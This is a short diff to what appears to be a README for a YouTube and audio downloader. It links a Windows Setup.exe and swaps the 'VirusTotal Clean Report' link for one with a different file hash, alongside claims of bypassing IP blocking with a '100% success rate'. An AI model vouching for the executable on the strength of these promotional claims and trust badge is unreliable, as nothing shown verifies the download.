@@ -18,7 +18,7 @@
 * **Best For:** YouTube (4K/1080p) and long-form audio extraction.
 * **Why it exists:** Engineered to bypass cloud-IP blocking by using local machine processing, ensuring a 100% success rate where web servers fail.
 * **Installation:** Download the official setup 🚀🚀 [**Download the Official Setup.exe here**](https://github.com/Billybu092/Habbet-web/releases/download/v1.1.0/Habbet_Eli_t7ebb_Setup_v1.1.exe)
-* **Security & Trust:** ✅ View VirusTotal Clean Report: [Click Here!!](https://www.virustotal.com/gui/file/4e77178a0ff7d304901afec10035617f669631e7c5f09fbf30f16e7d4b5c0aff/detection) .
+* **Security & Trust:** ✅ View VirusTotal Clean Report: [**Click Here!!**](https://www.virustotal.com/gui/file/7ed0071c8eadbd9bdaba1717c84bfdeb9f4912398eb41cdbec7a191277b134bf?nocache=1) .
 
 ---
 
